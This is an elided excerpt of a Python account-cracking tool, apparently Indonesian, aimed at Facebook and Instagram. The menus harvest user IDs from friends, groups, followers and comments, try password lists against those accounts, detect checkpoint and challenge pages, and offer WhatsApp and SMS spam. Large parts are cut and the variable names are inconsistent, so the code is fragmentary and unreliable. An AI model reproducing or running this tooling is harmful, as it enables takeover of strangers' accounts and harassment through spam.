...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold green]_____ __ ___________  _______ __   
[bold green]  | |   / _ \   | |\/| | / _ \             
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							print("\n [+] Login Berhasil | python Tama.py");followdong()
			except Exception as e:
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Rochmat Basuki , Nazri XD , Aorec XD , Lukman-XD , Dapunta, Mr.tama , Kall",width=90,title=f"[bold green]Thanks To",style=f"bold white"))
	...
	_____Mr.Tama_______ = input(f' [+] Pilih Menu Crack : ')
	if _____Mr.Tama_______ in ['1','01']:
		tama_dump()
	elif _____Mr.Tama_______ in ['2','02']:
		dump_massal()
	elif _____Mr.tama_______ in ['3','03']:
		crack_group()
	elif _____Mr.Tama_______ in ['4','04']:
		crack_email()
	elif _____Mr.Tama_______ in ['5','05']:
		crack_file()
	elif _____Mr.Tama_______ in ['6','06']:
		crack_nama()
	elif _____Mr.Tama_______ in ['7','07']:
		pengikut()
	elif _____Mr.Tama_______ in ['8','08']:
		komen()
	elif _____Mr.Tama_______ in ['9','09']:
		file_cp()
	elif _____Mr.Tama_______ in ['10']:
		result()
	elif _____Mr.Tama_______ in ['11']:
		siu()
	elif _____Mr.Tama_______ in ['12']:
		spam_wa()
	elif _____Mr.Tama_______ in ['13']:
		spam_sms()
	elif _____Mr.Tama_______ in ['14']:
		dumpid()
	elif _____Mr.Tama_______ in ['instagram','Instagram']:
		loginCookie()
	elif _____Mr.Tama_______ in ['15']:
...
def lainnya():
	...
	if bray in(''):
		print(' [+] Pilih Yang Bener Kontol ');exit()
	if tama in('1','01'):
		crack_nama()
	elif tama in('2','02'):
		pengikut()
...
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," pontianak"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
...
def crack_email():
	...
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya, atau nama elu',width=90,padding=(0,5),style=f"bold white"))
...
#------------------[ RANDOM RICH ]-------------------#
TA      = random.choice([M2,K2,H2,B2,N2])
MA     = random.choice ([LIGHT,GOLD,MEDIUM,PINK,SKY,ORNG,ORCH])
TAMA1 = random.choice([L1,G1,M1,P1,S1,O1,O1])
TAMA2 = random.choice([H,K,O,B])
...
#------------------[ METODE API V1 ]-------------------#
	def crackAPI(self,user,pas):
		...
		try:
			for pw in pas:
				TAMA=random.randint(1000000000, 99999999999)
				...
				elif 'href="https://www.instagram.com/challenge/action/' in str(Mr.Tama):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					tree = Tree("")
	...
	def menu(self):
		...
		if c=='':
			...
			if mas in ['y','Y']:
				...
				print(" Y/t Bro Jangan Kosong kan disuruh pilih🤦")
